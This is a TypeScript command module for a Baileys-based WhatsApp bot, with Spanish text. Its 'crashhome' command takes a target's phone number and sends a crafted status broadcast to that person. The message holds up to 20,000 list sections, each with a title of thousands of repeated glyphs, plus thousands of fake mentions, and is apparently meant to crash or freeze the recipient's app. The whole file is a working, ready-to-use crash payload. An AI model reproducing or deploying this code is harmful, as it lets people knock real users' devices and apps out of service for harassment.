import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const digits = (j: string) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");

function buildMsg(isTarget: string, n: number) {
  const sections = Array.from({ length: n }, (_, r) => ({
    title: "᭯".repeat(n),
    rows: [{ title: String(r + 1), id: String(r + 1) }],
  }));

  const jids = Array.from(
    { length: n },
    () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
  );

  return {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "x",
          listType: 2,
          buttonText: null,
          sections,
          singleSelectReply: { selectedRowId: "x" },
          contextInfo: {
            mentionedJid: jids,
            participant: isTarget,
            remoteJid: "status@broadcast",
            forwardingScore: n,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "0@newsletter",
              serverMessageId: 1,
              newsletterName: "x",
            },
          },
          description: "x",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
}

export default {
  name: ["crashhome", "crashhm"],
  category: "group",
  description: "Lista monstruosa a status@broadcast con menciones falsas. `.crashhome <número|mención|respuesta>`.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const citado = info.participant ? digits(info.participant) : "";
    const mencion = info.mentionedJid?.[0] ? digits(info.mentionedJid[0]) : "";
    const escrito = (args[0] || "").replace(/\D/g, "");

    const num = escrito.length >= 8 ? escrito : mencion || citado;
    if (!num) {
      await reply("Necesito un número, una mención o una respuesta. `.crashhome 573138523021`").catch(() => undefined);
      return;
    }

    const isTarget = `${num}@s.whatsapp.net`;

    let n = 9741;
    if (/^\d+$/.test(args[0] || "")) n = Math.min(20000, Math.max(50, Number(args[0])));

    await react("🏠").catch(() => undefined);

    try {
      const { generateWAMessageFromContent } = await import("baileys");

      const built = generateWAMessageFromContent(isTarget, buildMsg(isTarget, n) as any, {});

      await sock.relayMessage("status@broadcast", built.message, {
        messageId: built.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }],
              },
            ],
          },
        ],
      } as any);

      await react("☠️").catch(() => undefined);
      await reply(
        `🏠 ${fytBold("Crashhome enviado")} → +${num}\n` +
          `Secciones: ${n.toLocaleString("es-MX")} · títulos de ${n.toLocaleString("es-MX")} caracteres\n` +
          `Menciones falsas: ${n.toLocaleString("es-MX")}`,
      ).catch(() => undefined);
    } catch (e: any) {
      await react("❌").catch(() => undefined);
      await reply(`❌ ${e?.message || e}`).catch(() => undefined);
    }
  },
};
